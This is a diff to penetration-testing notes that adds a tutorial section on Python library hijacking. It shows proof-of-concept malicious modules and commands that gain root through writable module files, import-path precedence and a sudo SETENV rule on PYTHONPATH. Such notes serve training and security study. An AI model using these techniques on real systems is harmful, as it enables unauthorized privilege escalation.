@@ -2185,8 +2185,6 @@ gcc -fPIC -shared -o /development/libshared.so dbquery.c
 - `-shared`: creates a shared library.
 - `-o`: names the output file.
 
----
-
 ### Step 3: Run the Vulnerable Binary
 
 Now execute the binary again:
@@ -2198,3 +2196,118 @@ Since it loads our malicious `libshared.so`, it will call `dbquery()` — which 
 
 ---
 
+# Python Library Hijacking 
+
+## 📌 Overview
+Python's popularity stems from its simplicity and vast ecosystem of libraries. However, this flexibility can introduce security vulnerabilities, especially in environments with misconfigured permissions.
+
+
+## 📚 Commonly Used Libraries
+- **NumPy**: Numerical computing, arrays, matrices, linear algebra, random number generation.
+- **Pandas**: Data analysis and manipulation, especially time series.
+- **Python Standard Library**: Built-in modules for various tasks, loaded only when imported to maintain performance.
+
+## 📥 Importing Modules
+```python
+# Method 1
+import pandas
+
+# Method 2
+from pandas import *
+
+# Method 3
+from pandas import Series
+```
+
+
+## ⚠️ Library Hijacking Vectors
+1. **Wrong Write Permissions**
+2. **Library Path Precedence**
+3. **PYTHONPATH Environment Variable**
+
+## 1️⃣ Wrong Write Permissions
+
+### Scenario:
+- A Python script (`mem_status.py`) with SUID permissions imports a module (`psutil`).
+- If the module file is world-writable, it can be modified to include malicious code.
+
+### Example:
+```bash
+ls -l mem_status.py
+# -rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
+```
+
+### Original Script:
+```python
+#!/usr/bin/env python3
+import psutil
+
+available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+print(f"Available memory: {round(available_memory, 2)}%")
+```
+
+### Hijacked Module:
+```python
+def virtual_memory():
+    import os
+    os.system('id')  # Malicious code
+    ...
+```
+
+### Execution:
+```bash
+sudo /usr/bin/python3 ./mem_status.py
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+## 2️⃣ Library Path Precedence
+
+### Python Module Search Order:
+```bash
+python3 -c 'import sys; print("\n".join(sys.path))'
+```
+
+### Exploit Conditions:
+- Target module is in a lower-priority path.
+- Attacker can write to a higher-priority path.
+
+### Example:
+- `psutil` is in `/usr/local/lib/python3.8/dist-packages`
+- `/usr/lib/python3.8` is writable and higher in priority.
+
+### Malicious Module:
+```python
+# /usr/lib/python3.8/psutil.py
+import os
+
+def virtual_memory():
+    os.system('id')
+```
+
+### Result:
+```bash
+sudo /usr/bin/python3 mem_status.py
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## 3️⃣ PYTHONPATH Environment Variable
+
+### Description:
+- PYTHONPATH defines directories Python searches for modules.
+- If `sudo` allows `SETENV`, the user can override PYTHONPATH.
+
+### Check Permissions:
+```bash
+sudo -l
+# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
+```
+
+### Exploit:
+```bash
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
